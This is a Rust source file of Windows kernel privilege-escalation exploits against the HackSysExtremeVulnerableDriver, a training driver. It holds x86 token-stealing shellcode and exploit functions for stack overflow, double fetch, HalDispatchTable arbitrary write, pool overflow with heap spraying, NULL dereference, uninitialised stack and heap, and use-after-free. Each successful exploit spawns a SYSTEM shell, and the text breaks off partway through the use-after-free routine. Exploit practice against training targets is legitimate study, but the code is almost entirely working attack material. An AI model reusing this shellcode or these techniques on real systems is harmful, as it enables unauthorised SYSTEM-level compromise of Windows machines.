#[cfg(windows)] extern crate winapi;
#[cfg(windows)] extern crate kernel32;
#[cfg(windows)] extern crate psapi;

use std::io::{stdin,stdout,Write};

use std::ptr;
use std::thread;

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::rc::Rc;

extern crate byteorder;
use byteorder::{LittleEndian, WriteBytesExt};

use std::process::Command;
use std::process;

#[cfg(windows)]
fn open_device() -> std::os::windows::raw::HANDLE {
    use std::ffi::CString;
    use kernel32::CreateFileA;

    let hev_device;
    unsafe {
        hev_device = CreateFileA(CString::new("\\\\.\\HackSysExtremeVulnerableDriver").unwrap().as_ptr(), 0xC0000000, 0, ptr::null_mut(), 0x3, 0, ptr::null_mut());
    }
    if hev_device == ptr::null_mut() {
        panic! ("Failed opening device!");
    }

    hev_device
}

fn check_priv(priv_name : &str) -> bool {
    use std::ffi::CString;
    use kernel32::GetLastError;
    use winapi::um::winbase::LookupPrivilegeValueA;
    use winapi::shared::winerror::ERROR_NO_TOKEN;
    use winapi::shared::minwindef::{BOOL, LPBOOL};
    use winapi::um::securitybaseapi::PrivilegeCheck;
    use winapi::um::winnt::{RtlMoveMemory, TOKEN_QUERY, LUID, PRIVILEGE_SET, PRIVILEGE_SET_ALL_NECESSARY, SE_PRIVILEGE_ENABLED};
    use winapi::um::processthreadsapi::{OpenThreadToken, GetCurrentThread, OpenProcessToken, GetCurrentProcess};

    let mut hToken = ptr::null_mut();

    unsafe {
        // Get the calling thread's access token.
        if OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, 1, &mut hToken) == 0 {
            if GetLastError() != ERROR_NO_TOKEN {
                println! ("CAN'T GET THREAD TOKEN!!!\n");
                return false;
            }

            // Retry against process token if no thread token exists.
            if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut hToken) == 0 {
                println! ("CAN'T GET PROCESS TOKEN!!!\n");
                return false;
            }
        }

        //Find the LUID for the debug privilege token
        let mut luidDebugPrivilege : LUID = LUID::default();
        // lookup privilege on local system
        // look for SeDebugPrivilege
        // receives LUID
        if LookupPrivilegeValueA(ptr::null_mut(), CString::new(priv_name).unwrap().as_ptr(), &mut luidDebugPrivilege) == 0 {
            println! ("Failed looking for privilege");
            return false;
        }

        let mut privs : PRIVILEGE_SET = PRIVILEGE_SET::default();
        privs.PrivilegeCount = 1;
        privs.Control = PRIVILEGE_SET_ALL_NECESSARY;

        privs.Privilege[0].Luid = luidDebugPrivilege;
        privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED; 

        let mut bResult : BOOL = 0;
        PrivilegeCheck(hToken, &mut privs, &mut bResult as LPBOOL);

        return bResult != 0;
    }

    false
}

fn check_system() -> bool {
    check_priv("SeImpersonatePrivilege") && check_priv("SeDebugPrivilege") && check_priv("SeLockMemoryPrivilege")
}

fn get_payload_token_stealing (payload_end : &[u8]) -> Vec<u8> {
    let mut token_stealing_payload : Vec<u8> = vec![
            0x60,                                       // pushad
            // Get nt!_KPCR.PcrbData.CurrentThread
            0x31, 0xc0,                                 // xor eax,eax
            0x64, 0x8b, 0x80, 0x24, 0x01, 0x00, 0x00,   // mov eax,[fs:eax+0x124]
            // Get nt!_KTHREAD.ApcState.Process
            0x8b, 0x40, 0x50,                           // mov eax,[eax+0x50]
            0x89, 0xc1,                                 // mov ecx,eax
            0xba, 0x04, 0x00, 0x00, 0x00,               // mov edx,0x4
            // lookup for the system eprocess
            0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00,         // mov eax,[eax+0xb8]
            0x2d, 0xb8, 0x00, 0x00, 0x00,               // sub eax,0xb8
            0x39, 0x90, 0xb4, 0x00, 0x00, 0x00,         // cmp [eax+0xb4],edx
            0x75, 0xed,                                 // jnz 0x1a

            // get the system token
            0x8b, 0x90, 0xf8, 0x00, 0x00, 0x00,         // mov edx,[eax+0xf8]
            // patch it in our current eprocess
            0x89, 0x91, 0xf8, 0x00, 0x00, 0x00,         // mov [ecx+0xf8],edx

            // Increment the token reference count.
            // The PointerCount gets decremented when the process exit.
            // If it arrives to 0,
            // the SYSTEM TOKEN is freed and this causes a BSoD.
            // Here we won't get that BSoD,
            // since we "properly" increase the PointerCount.
            // OBJECT_HEADER.PointerCount
            0xb9, 0x07, 0x00, 0x00, 0x00,               // mov ecx, 7
            0xf7, 0xd1,                                 // not ecx
            0x21, 0xca,                                 // and edx, ecx
            // TOKEN-0x18 = Token Object Header
            0x83, 0xea, 0x18,                           // sub edx, 0x18
            // patch PointerCount
            // set it to a high value
            0xc7, 0x02, 0x00, 0x00, 0x01, 0x00,         // mov dword ptr [edx], 0x10000

            // set NTSTATUS to 0
            0x31, 0xc0,                                 // xor eax,eax               \

            0x61,                                       // popad                     \
    ];

    for byte in payload_end.iter() {
        token_stealing_payload.push(*byte);
    }

    token_stealing_payload
}

#[cfg(windows)]
fn exploit_bof_token (cmd : &str) {
    use kernel32::{CloseHandle, VirtualAlloc, DeviceIoControl};
    use winapi::um::winnt::RtlMoveMemory;

    let payload_end : Vec<u8> = vec![
        0x31, 0xc0,         // xor eax, eax
        0x5d,               // pop ebp
        0xc2, 0x08, 0x00,   // ret 0x8
    ];
    let payload = get_payload_token_stealing(&payload_end);
    let mut n_read : u32 = 0;

    let len_payload = payload.len();

    println! ("\n== Stack Overflow Exploitation\n");

    unsafe {
        println! ("[+] Allocating shellcode space");
        let ptr = VirtualAlloc(ptr::null_mut(), len_payload as u32, 0x3000, 0x40);
        println! ("[+] Copying shellcode");
        RtlMoveMemory(ptr as *mut winapi::ctypes::c_void, payload.as_ptr() as *const winapi::ctypes::c_void, len_payload);

        println! ("[+] Preparing attack payload");
        let big_buf : [ u8; 2080 ] = [ 0x41; 2080 ];
        let mut buf : Vec<u8> = Vec::with_capacity(2084);

        for byte in big_buf.iter() {
            buf.push(*byte);
        }

        buf.write_u32::<LittleEndian>(ptr as u32).unwrap();

        println! ("[+] Opening device");
        let hev_device = open_device();

        println! ("[+] Triggering vuln");
        DeviceIoControl(hev_device, 0x222003, buf.as_ptr() as *mut std::os::raw::c_void, buf.len() as u32, ptr::null_mut(), 0, &mut n_read, ptr::null_mut());

        CloseHandle(hev_device);
    }

    if check_system() {
        println! ("[+] NT_AUTHORITY\\SYSTEM shell incoming");
        let mut child = Command::new(cmd).spawn().expect("Failed to execute command");
        let _ecode = child.wait()
                     .expect("failed to wait on child");
    }
    else {
        println! ("[-] Failed getting SYSTEM");
    }
}

#[cfg(windows)]
fn exploit_double_fetch (cmd : &str) {
    use kernel32::{CloseHandle, VirtualAlloc, DeviceIoControl};
    use winapi::um::winnt::RtlMoveMemory;

    let payload_end : Vec<u8> = vec![
        0x31, 0xc0,         // xor eax, eax
        0x5d,               // pop ebp
        0xc2, 0x08, 0x00,   // ret 0x8
    ];
    let payload = get_payload_token_stealing(&payload_end);
    let mut n_read : u32 = 0;

    let len_payload = payload.len();
    let mut exploit_success = Arc::new(AtomicBool::new(false));

        if check_system() == false {
            println! ("We're not system yet");
        }

    println! ("\n== Stack Overflow Exploitation\n");

    unsafe {
        println! ("[+] Allocating shellcode space");
        let ptr = VirtualAlloc(ptr::null_mut(), len_payload as u32, 0x3000, 0x40);
        println! ("[+] Copying shellcode");
        RtlMoveMemory(ptr as *mut winapi::ctypes::c_void, payload.as_ptr() as *const winapi::ctypes::c_void, len_payload);

        println! ("[+] Preparing attack payload");
        let big_buf : [ u8; 2080 ] = [ 0x41; 2080 ];
        let mut buf : Vec<u8> = Vec::with_capacity(2084);

        for byte in big_buf.iter() {
            buf.push(*byte);
        }

        buf.write_u32::<LittleEndian>(ptr as u32).unwrap();

        //
        println! ("[+] Prepare user structure");
        let mut user_obj : Vec<u8> = Vec::with_capacity(0x8);
        user_obj.write_u32::<LittleEndian>(buf.as_ptr() as u32).unwrap();
        user_obj.write_u32::<LittleEndian>(0x800).unwrap();

        let mut ptr_obj1 = user_obj.as_ptr() as u32;
        let mut ptr_obj2 = user_obj.as_mut_ptr();

        println! ("[+] Starting flipping threads");
        for _idx in 0..12 {
            let mut flip_success = exploit_success.clone();
            thread::spawn( move || {
                let mut value : u8 = 0;

                while flip_success.load(Ordering::Relaxed) == false {
                    value = value ^ 0x24;
                    ptr::write((ptr_obj1 + 4) as *mut u8, value);
                }
            });
        }

        println! ("[+] Opening device");
        let hev_device = open_device();

        println! ("[+] Triggering vuln");
        while exploit_success.load(Ordering::Relaxed) == false {
            DeviceIoControl(hev_device, 0x222037, ptr_obj2 as *mut std::os::raw::c_void, 0, ptr::null_mut(), 0, &mut n_read, ptr::null_mut());
            //println! ("Trying trigger");
            if check_system() {
                println! ("Got system!");

                exploit_success.store(true, Ordering::Relaxed);
                break;
            }
        }

        CloseHandle(hev_device);
    }

    if check_system() {
        println! ("[+] NT_AUTHORITY\\SYSTEM shell incoming");
        let mut child = Command::new(cmd).spawn().expect("Failed to execute command");
        let _ecode = child.wait()
                     .expect("failed to wait on child");
    }
    else {
        println! ("[-] Failed getting SYSTEM");
    }
}

#[cfg(windows)]
fn lookup_base (module_name : &str) -> Option<(String,usize)> {
    let mut drivers_base : Vec<usize> = Vec::with_capacity(2048);
    let mut n_drivers = drivers_base.capacity() as u32;
    let success;

    unsafe {
        drivers_base.set_len(n_drivers as usize);
    }

    unsafe {
        success = psapi::EnumDeviceDrivers(drivers_base.as_ptr() as *mut *mut std::os::raw::c_void, 1024, &mut n_drivers);
    }
    if success == 0 {
        eprintln! ("Failed to enumerate!!!");
        return None;
    }

    for base_address in drivers_base {
        if base_address == 0 {
            continue
        }

        let mut base_name : [ u8; 1024 ] = [ 0; 1024 ];
        let driver_base_name;
        unsafe {
            driver_base_name = psapi::GetDeviceDriverBaseNameA(base_address as *mut std::os::raw::c_void, base_name.as_ptr() as *mut i8, 48);
        }
        if driver_base_name == 0 {
            eprintln! ("Unable to get driver base name!!!");
            continue;
        }

        // search for index position to ignore the remaining zeros
        let idx_zero = match base_name.iter().position(|&x| x == 0) {
            Some (v) => v,
            None => base_name.len(),
        };
        let cname = match std::str::from_utf8(&base_name[..idx_zero]) {
            Ok (v) => v,
            Err (_e) => {
                eprintln! ("Couldn't get string from str");
                continue;
            },
        };

        if cname.to_lowercase() == module_name.to_string().to_lowercase()
            || cname.to_lowercase().contains(module_name.to_string().to_lowercase().as_str()) {
            return Some ((cname.to_string(), base_address));
        }
    }

    None
}

#[cfg(windows)]
fn write4_at (addr : u32, value : u32) {
    use kernel32::{ CloseHandle, DeviceIoControl };

    let mut buf_value : Vec<u8> = Vec::with_capacity(16);
    let mut www : Vec<u8> = Vec::with_capacity(16);
    let mut n_read : u32 = 0;

    buf_value.write_u32::<LittleEndian>(value).unwrap();

    www.write_u32::<LittleEndian>(buf_value.as_ptr() as u32).unwrap();
    www.write_u32::<LittleEndian>(addr).unwrap();

    let hev_device = open_device();

    println! ("-> Writing 0x{:x} to 0x{:x}", value, addr);
    unsafe {
        DeviceIoControl(hev_device,
                        0x22200b,
                        www.as_ptr() as *mut std::os::raw::c_void,
                        www.len() as u32,
                        ptr::null_mut(),
                        0,
                        &mut n_read,
                        ptr::null_mut());

        CloseHandle(hev_device);
    }
}

#[cfg(windows)]
fn exploit_arbitrary_write (cmd : &str) {
    use std::ffi::CString;
    use kernel32::{ GetProcAddress };
    use kernel32::{ VirtualAlloc, LoadLibraryExA };
    use winapi::um::winnt::RtlMoveMemory;

    let payload_end : Vec<u8> = vec![
        0x31, 0xc0,         // xor eax, eax
        0x83, 0xc4, 0x24,   // add esp, byte +0x24
        0x5d,               // pop ebp
        0xc2, 0x08, 0x00,   // ret 0x8
    ];
    let payload = get_payload_token_stealing(&payload_end);

    let len_payload = payload.len();

    println! ("\n== Arbitrary Overwrite Exploitation\n");

    println! ("[+] Looking for Windows kernel base");
    let mod_ntkrnl = match lookup_base("ntkrnl") {
        Some (v) => v,
        None => panic! ("Failed resolving ntkrnl base"),
    };
    let (name_ntkrnl, base_ntkrnl) = mod_ntkrnl;
    println! ("-> kernel base               : 0x{:x}", base_ntkrnl);
    println! ("name : {} addr : 0x{:x}", name_ntkrnl, base_ntkrnl);

    let mod_hal = match lookup_base("hal") {
        Some (v) => v,
        None => panic! ("Failed resolving hal base"),
    };
    let (name_hal, base_hal) = mod_hal;
    println! ("-> HAL base                  : 0x{:x}", base_hal);
    println! ("name : {} addr : 0x{:x}", name_hal, base_hal);

    let addr_ntkrnl;
    let mut addr_hal_dispatch;
    unsafe {
        println! ("[+] Getting HalDispatchTable offset in ntkrnl");
        addr_ntkrnl = LoadLibraryExA(name_ntkrnl.as_ptr() as *const i8, ptr::null_mut(), 1);
        if addr_ntkrnl == ptr::null_mut() {
            panic! ("Unable to load ntkrnl");
        }
        println! ("-> ntkrnl base               : 0x{:x}", addr_ntkrnl as u32);

        let symbol_name = CString::new("HalDispatchTable").unwrap();
        addr_hal_dispatch = GetProcAddress(addr_ntkrnl,
                                           symbol_name.as_ptr() as *const i8);
        if addr_hal_dispatch == ptr::null_mut() {
            panic! ("Unable to load HAL");
        }
        let off_hal = addr_hal_dispatch as usize - addr_ntkrnl as usize;
        println! ("-> HalDispatchTable uaddr    : 0x{:x}", addr_hal_dispatch as u32);
        println! ("-> HalDispatchTable offset   : 0x{:x}", off_hal);

        println! ("[+] Getting HalDispatchTable kernel address");
        addr_hal_dispatch = (base_ntkrnl + off_hal) as *mut std::os::raw::c_void;
        println! ("-> HalDispatchTable addr     : 0x{:x}", addr_hal_dispatch as usize);
        println! ("-> HalDispatchTable+4 addr   : 0x{:x}", addr_hal_dispatch as usize + 4);

        println! ("[+] Resolving HaliQuerySystemInformation");
        println! ("-> Loading {}", name_hal);
        let addr_hal = LoadLibraryExA(name_hal.as_ptr() as *const i8, ptr::null_mut(), 1);
        if addr_hal == ptr::null_mut() {
            panic! ("Unable to load HAL");
        }

        println! ("[+] Allocating shellcode space");
        let addr_shellcode = VirtualAlloc(ptr::null_mut(), len_payload as u32, 0x3000, 0x40);
        println! ("[+] Copying shellcode to address : 0x{:x}", addr_shellcode as u64);
        RtlMoveMemory(addr_shellcode as *mut winapi::ctypes::c_void, payload.as_ptr() as *const winapi::ctypes::c_void, len_payload);

        println! ("[+] Patching HalDispatchTable+4 with shellcode addr");
        write4_at(addr_hal_dispatch as u32 + 4, addr_shellcode as u32);

        println! ("[+] Trigger privesc");
        let mut interval : Vec<u8> = Vec::with_capacity(16);
        interval.write_u32::<LittleEndian>(0).unwrap();
        NtQueryIntervalProfile(0x1337 as PVOID, interval.as_ptr() as ULONG_PTR);

        // XXX: dynamically resolve HaliQuerySystemInformation,
        println! ("[+] Restoring HalDispatchTable+4 with original value : 0x{:x}", base_hal as u32 + 0x278a2);
        write4_at(addr_hal_dispatch as u32 + 4, base_hal as u32 + 0x278a2);
    }

    if check_system() {
        println! ("[+] NT_AUTHORITY\\SYSTEM shell incoming");
        let mut child = Command::new(cmd).spawn().expect("Failed to execute command");
        let _ecode = child.wait()
                     .expect("failed to wait on child");
    }
    else {
        println! ("[-] Failed getting SYSTEM");
    }
}

#[cfg(windows)]
fn pool_spray (n_handles : usize) -> Vec<std::os::windows::raw::HANDLE> {
    use kernel32::CreateEventA;
    let mut handles = Vec::with_capacity(n_handles);

    for _idx in 0..n_handles {
        let handle;
        unsafe {
            handle = CreateEventA(ptr::null_mut(), 0, 0, ptr::null_mut());
        }
        handles.push(handle);
    }

    handles
}

#[cfg(windows)]
fn pool_create_holes (handles : &[std::os::windows::raw::HANDLE], start : usize, end : usize, size : usize) -> usize {
    use kernel32::CloseHandle;

    let n_frees = size / 0x40;
    let step = 2 * n_frees;
    let mut n_holes = 0;

    let mut idx = start;
    while idx < end {
        for handle in &handles[idx..idx+n_frees] {
            unsafe {
                CloseHandle(*handle);
            }
        }

        idx += step;
        n_holes += 1
    }

    n_holes
}

#[cfg(windows)]
fn free_handles (handles : &[std::os::windows::raw::HANDLE]) {
    use kernel32::CloseHandle;

    for handle in handles {
        //println! ("Freeing {:?}", *handle);
        unsafe {
            CloseHandle(*handle);
        }
    }
}

pub enum CVoid {}
pub type CLong = i32;
pub type CUlong = u32;

pub type HANDLE = *mut CVoid;
pub type PVOID = *mut CVoid;
pub type ULONG_PTR = usize;
pub type PULONG_PTR = *mut usize;
pub type PSIZE_T = *mut ULONG_PTR;
pub type ULONG = CUlong;

pub type LONG = CLong;
pub type NTSTATUS = LONG;

#[cfg(windows)]
#[link(name="ntdll")]
extern "stdcall" {
    fn NtAllocateVirtualMemory(
        ProcessHandle   : HANDLE,
        //BaseAddress     : PVOID,
        BaseAddress     : PSIZE_T,
        ZeroBits        : ULONG_PTR,
        RegionSize      : PSIZE_T,
        AllocationType  : ULONG,
        Protect         : ULONG
    ) -> NTSTATUS;

    fn NtMapUserPhysicalPages(
        ProcessHandle   : HANDLE,
        NumberOfPages   : ULONG_PTR,
        UserPfnArray    : PULONG_PTR,
    ) -> NTSTATUS;

    fn NtQueryIntervalProfile (
        ProfileSource   : PVOID,
        Interval        : ULONG_PTR
    ) -> NTSTATUS;
}

#[cfg(windows)]
fn exploit_nonpaged_pool_overflow_token (cmd : &str) {
    use kernel32::{CloseHandle, VirtualAlloc, DeviceIoControl};
    use winapi::um::winnt::RtlMoveMemory;

    let payload_end : Vec<u8> = vec![
        0x31, 0xc0,         // xor eax, eax
        0xc2, 0x10, 0x00,   // ret 0x10
    ];
    let payload = get_payload_token_stealing(&payload_end);

    let mut n_read : u32 = 0;

    let len_payload = payload.len();

    println! ("\n== Non-Paged Pool Overflow Exploitation\n");

    unsafe {
        println! ("[+] Allocating shellcode space");
        let addr_shellcode = VirtualAlloc(ptr::null_mut(), len_payload as u32, 0x3000, 0x40);
        println! ("[+] Copying shellcode to address : 0x{:x}", addr_shellcode as u64);
        RtlMoveMemory(addr_shellcode as *mut winapi::ctypes::c_void, payload.as_ptr() as *const winapi::ctypes::c_void, len_payload);

        println! ("[+] Prepare NULL Page");
        let mut addr_landing : usize = 1;
        let mut memsize : usize = 0x1000;
        let null_page = NtAllocateVirtualMemory(0xffff_ffff as HANDLE, &mut addr_landing as PSIZE_T, 0, &mut memsize as PSIZE_T, 0x3000, 0x40);
        if null_page != 0 {
            panic! ("[-] Couldn't allocate NULL page");
        }

        println! ("-> Crafting fake OBJECT_TYPE object");

        // the callback we wanna setup
        let mut OkayToCloseProcedure : Vec<u8> = Vec::with_capacity(16);
        OkayToCloseProcedure.write_u32::<LittleEndian>(addr_shellcode as u32).unwrap();

        // insert our callback
        // offset 0x74 is our OkayToCloseProcedure callback
        // it gets call when CloseHandle() is called
        RtlMoveMemory(0x74 as *mut winapi::ctypes::c_void, OkayToCloseProcedure.as_ptr() as *const winapi::ctypes::c_void, OkayToCloseProcedure.len());

        println! ("[+] Heap Spraying Event objects");
        let handles = pool_spray(20000);

        println! ("[+] Create holes of 0x200 bytes");
        let n_holes = pool_create_holes (&handles, 10000, 15000, 0x200);
        println! ("-> Created {} holes", n_holes);

        println! ("[+] Preparing corruption buffer");
        let big_buf : [ u8; 0x1f8 ] = [ 0x41; 0x1f8 ];
        let mut buf : Vec<u8> = Vec::with_capacity(0x1f8);

        for byte in big_buf.iter() {
            buf.push(*byte);
        }

        // struct POOL_HEADER
        // event pool_header
        buf.write_u32::<LittleEndian>(0x04080040).unwrap();
        // event tag
        buf.write_u32::<LittleEndian>(0xee657645).unwrap();

        // struct OBJECT_HEADER_QUOTA_INFO
        // PagedPoolCharge
        buf.write_u32::<LittleEndian>(0).unwrap();
        // NonPagedPoolCharge
        buf.write_u32::<LittleEndian>(0x40).unwrap();
        // SecurityDescriptorCharge
        buf.write_u32::<LittleEndian>(0).unwrap();
        // SecurityDescriptorQuotaBlock
        buf.write_u32::<LittleEndian>(0).unwrap();

        // struct OBJECT_HEADER
        // PointerCount
        buf.write_u32::<LittleEndian>(1).unwrap();
        // HandleCount
        buf.write_u32::<LittleEndian>(1).unwrap();
        // Lock
        buf.write_u32::<LittleEndian>(0).unwrap();
        // TypeIndex (original value was 0xc)
        buf.write_u8(0).unwrap();

        println! ("[+] Opening device");
        let hev_device = open_device();

        println! ("[+] Overflowing our buffer");
        DeviceIoControl(hev_device, 0x22200f, buf.as_ptr() as *mut std::os::raw::c_void, buf.len() as u32, ptr::null_mut(), 0, &mut n_read, ptr::null_mut());

        println! ("[+] Triggering token stealing payload");
        free_handles(&handles);

        CloseHandle(hev_device);
    }

    if check_system() {
        println! ("[+] NT_AUTHORITY\\SYSTEM shell incoming");
        let mut child = Command::new(cmd).spawn().expect("Failed to execute command");
        let _ecode = child.wait()
                     .expect("failed to wait on child");
    }
    else {
        println! ("[-] Failed getting SYSTEM");
    }
}

#[cfg(windows)]
fn alloc_null_page () -> i32 {
    let null_page;
    let mut addr : usize = 1;
    let mut size : usize = 0x1000;
    unsafe {
        null_page = NtAllocateVirtualMemory(0xffff_ffff as HANDLE, &mut addr as PSIZE_T, 0, &mut size as PSIZE_T, 0x3000, 0x40);
    }

    null_page
}

#[cfg(windows)]
fn exploit_null_deref_token (cmd : &str) {
    use kernel32::{CloseHandle, VirtualAlloc, DeviceIoControl};
    use winapi::um::winnt::RtlMoveMemory;

    let payload_end : Vec<u8> = vec![
        0x31, 0xc0,         // xor eax, eax
        0xc3,               // ret
    ];
    let payload = get_payload_token_stealing(&payload_end);
    let mut n_read : u32 = 0;

    let len_payload = payload.len();

    println! ("\n== NULL Dereference Exploitation\n");

    unsafe {
        println! ("[+] Allocating shellcode space");
        let addr_shellcode = VirtualAlloc(ptr::null_mut(), len_payload as u32, 0x3000, 0x40);
        println! ("[+] Copying shellcode to address : 0x{:x}", addr_shellcode as u64);
        RtlMoveMemory(addr_shellcode as *mut winapi::ctypes::c_void, payload.as_ptr() as *const winapi::ctypes::c_void, len_payload);

        println! ("[+] Prepare NULL Page");
        let null_page = alloc_null_page();
        if null_page != 0 {
            panic! ("[-] Couldn't allocate NULL page");
        }

        println! ("-> Inserting custom callback");

        // the callback we wanna setup
        let mut callback : Vec<u8> = Vec::with_capacity(16);
        callback.write_u32::<LittleEndian>(addr_shellcode as u32).unwrap();

        // insert our callback
        // offset 0x74 is our OkayToCloseProcedure callback
        // it gets call when CloseHandle() is called
        RtlMoveMemory(0x4 as *mut winapi::ctypes::c_void, callback.as_ptr() as *const winapi::ctypes::c_void, callback.len());

        println! ("[+] Opening device");
        let hev_device = open_device();

        println! ("[+] Trigger null deref");
        println! ("-> Prepare user value");

        let mut user_value : Vec<u8> = Vec::with_capacity(16);
        user_value.write_u32::<LittleEndian>(0x1337babe as u32).unwrap();
        DeviceIoControl(hev_device, 0x22202b, user_value.as_ptr() as *mut std::os::raw::c_void, 0, ptr::null_mut(), 0, &mut n_read, ptr::null_mut());

        CloseHandle(hev_device);
    }

    if check_system() {
        println! ("[+] NT_AUTHORITY\\SYSTEM shell incoming");
        let mut child = Command::new(cmd).spawn().expect("Failed to execute command");
        let _ecode = child.wait()
                     .expect("failed to wait on child");
    }
    else {
        println! ("[-] Failed getting SYSTEM");
    }
}

#[cfg(windows)]
fn exploit_non_init_stack (cmd : &str) {
    use kernel32::{CloseHandle, VirtualAlloc, DeviceIoControl};
    use winapi::um::winnt::RtlMoveMemory;

    let payload_end : Vec<u8> = vec![
        0x31, 0xc0,         // xor eax, eax
        0xc3,               // ret
    ];
    let payload = get_payload_token_stealing(&payload_end);
    let mut n_read : u32 = 0;

    let len_payload = payload.len();

    println! ("\n== Non Initialized Stack Variable Exploitation\n");

    unsafe {
        println! ("[+] Allocating shellcode space");
        let addr_shellcode = VirtualAlloc(ptr::null_mut(), len_payload as u32, 0x3000, 0x40);
        println! ("[+] Copying shellcode to address : 0x{:x}", addr_shellcode as u64);
        RtlMoveMemory(addr_shellcode as *mut winapi::ctypes::c_void, payload.as_ptr() as *const winapi::ctypes::c_void, len_payload);

        println! ("[+] Opening device");
        let hev_device = open_device();

        println! ("[+] Prepare user value");

        let mut user_value : Vec<u8> = Vec::with_capacity(16);
        user_value.write_u32::<LittleEndian>(0xcafebabe as u32).unwrap();

        println! ("[+] Preparing non init stack");
        println! ("-> Building UserPfnArray");
        let n_pages = 1024;
        let mut user_pfn_array : Vec<u8> = Vec::with_capacity(n_pages * 4);

        for _idx in 0..n_pages {
            user_pfn_array.write_u32::<LittleEndian>(addr_shellcode as u32).unwrap();
        }

        println! ("-> Array at 0x{:x} ({} bytes)", user_pfn_array.as_ptr() as usize, user_pfn_array.len());

        println! ("-> Inserting our array on the kernel stack and then triggering the vuln");

        // call it just before the DeviceIoControl() so no intermediary userland calls can junk it
        NtMapUserPhysicalPages(ptr::null_mut(), n_pages, user_pfn_array.as_ptr() as PULONG_PTR);

        DeviceIoControl(hev_device, 0x22202f, user_value.as_ptr() as *mut std::os::raw::c_void, user_value.len() as u32, ptr::null_mut(), 0, &mut n_read, ptr::null_mut());

        CloseHandle(hev_device);
    }

    if check_system() {
        println! ("[+] NT_AUTHORITY\\SYSTEM shell incoming");
        let mut child = Command::new(cmd).spawn().expect("Failed to execute command");
        let _ecode = child.wait()
                     .expect("failed to wait on child");
    }
    else {
        println! ("[-] Failed getting SYSTEM");
    }
}

#[cfg(windows)]
fn pool_spray_lookaside4 (n_handles : usize, value : u32) -> Vec<std::os::windows::raw::HANDLE> {
    use kernel32::{ CreateEventA, CreateEventW };
    let mut handles = Vec::with_capacity(n_handles);

    for idx_handle in 0..n_handles {
        // prepare chunk
        let mut chunk : Vec<u8> = Vec::with_capacity(256);
        let n_values = (0xf0 - 4) / 4;

        for _idx_value in 0..n_values {
            chunk.write_u32::<LittleEndian>(value).unwrap();
        }
        chunk.write_u32::<LittleEndian>(idx_handle as u32 + 0x30303030).unwrap();

        // spray
        let handle;
        unsafe {
            // In ASCII, it will fail
            //handle = CreateEventA(ptr::null_mut(), 1, 0, chunk.as_ptr() as *mut i8);
            handle = CreateEventW(ptr::null_mut(), 1, 0, chunk.as_ptr() as *mut u16);
        }
        handles.push(handle);
    }

    handles
}

#[cfg(windows)]
fn exploit_non_init_heap (cmd : &str) {
    use kernel32::{CloseHandle, VirtualAlloc, DeviceIoControl};
    use winapi::um::winnt::RtlMoveMemory;

    let payload_end : Vec<u8> = vec![
        0x31, 0xc0,         // xor eax, eax
        0xc3,               // ret
    ];
    let payload = get_payload_token_stealing(&payload_end);
    let mut n_read : u32 = 0;

    let len_payload = payload.len();

    println! ("\n== Non Initialized Heap Variable Exploitation\n");

    unsafe {
        println! ("[+] Allocating shellcode space");
        let addr_shellcode = VirtualAlloc(0x13370000 as *mut std::os::raw::c_void, 0x10000 as u32, 0x3000, 0x40);
        let addr_landing = addr_shellcode as u32 + 0x1234;

        println! ("[+] Copying nopsled to address : 0x{:x}", addr_shellcode as u64);
        ptr::write_bytes(addr_shellcode as *mut u8, 0x90, 0x10000);
        println! ("[+] Copying shellcode to address : 0x{:x}", addr_landing as u64);
        RtlMoveMemory(addr_landing as *mut winapi::ctypes::c_void, payload.as_ptr() as *const winapi::ctypes::c_void, len_payload);

        println! ("[+] Opening device");
        let hev_device = open_device();

        println! ("[+] Prepare user value");

        let mut user_value : Vec<u8> = Vec::with_capacity(16);
        user_value.write_u32::<LittleEndian>(0xbad31337 as u32).unwrap();

        // we need to launch threads so we can poison each lookaside lists
        // XXX: Use SetThreadAffinityMask()
        println! ("[+] Heap Spraying Event objects");
        println! ("We'll be spraying 0x{:x} in the look-aside lists", addr_landing);
        let n_threads = 128;
        let mut threads = Vec::with_capacity(n_threads);
        for _idx in 0..n_threads {
            let cur_thread = thread::spawn( move || {
                let handles = pool_spray_lookaside4(256, addr_landing);
                //println! ("[+] Free handles");
                free_handles(&handles);
            });

            threads.push(cur_thread);
        }

        // threads need to join so we're "sure" that the threads poisoned their lookaside lists
        for cur_thread in threads {
            cur_thread.join();
        }

        println! ("-> Triggering the vuln");

        DeviceIoControl(hev_device, 0x222033, user_value.as_ptr() as *mut std::os::raw::c_void, user_value.len() as u32, ptr::null_mut(), 0, &mut n_read, ptr::null_mut());

        CloseHandle(hev_device);
    }

    if check_system() {
        println! ("[+] NT_AUTHORITY\\SYSTEM shell incoming");
        let mut child = Command::new(cmd).spawn().expect("Failed to execute command");
        let _ecode = child.wait()
                     .expect("failed to wait on child");
    }
    else {
        println! ("[-] Failed getting SYSTEM");
    }
}

#[cfg(windows)]
fn exploit_uaf (cmd : &str) {
    use kernel32::{CloseHandle, VirtualAlloc, DeviceIoControl};
    use winapi::um::winnt::RtlMoveMemory;

    let payload_end : Vec<u8> = vec![
        0x31, 0xc0,         // xor eax, eax
        0xc3,               // ret
    ];
    let payload = get_payload_token_stealing(&payload_end);
    let mut n_read : u32 = 0;

    let len_payload = payload.len();

    println! ("\n== Use-after-Free Exploitation\n");

    unsafe {
        println! ("[+] Allocating shellcode space");
        let addr_shellcode = VirtualAlloc(0x13370000 as *mut std::os::raw::c_void, 0x10000 as u32, 0x3000, 0x40);
        let addr_landing = addr_shellcode as u32 + 0x1234;

        println! ("[+] Copying nopsled to address : 0x{:x}", addr_shellcode as u64);
        ptr::write_bytes(addr_shellcode as *mut u8, 0x90, 0x10000);
        println! ("[+] Copying shellcode to address : 0x{:x}", addr_landing as u64);
        RtlMoveMemory(addr_landing as *mut winapi::ctypes::c_void, payload.as_ptr() as *const winapi::ctypes::c_void, len_payload);

        println! ("[+] Opening device");
        let hev_device = open_device();

        println! ("[+] Prepare user object");

        let mut user_obj : Vec<u8> = Vec::with_capacity(0x58);
        let n_vals = 0x58 / 4;
        for _idx in 0..n_vals {
            user_obj.write_u32::<LittleEndian>(addr_landing as u32).unwrap();
        }

        // HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT
        println! ("[+] Allocate UAF Object");
        DeviceIoControl(hev_device, 0x222013, ptr::null_mut(), 0, ptr::null_mut(), 0, &mut n_read, ptr::null_mut());

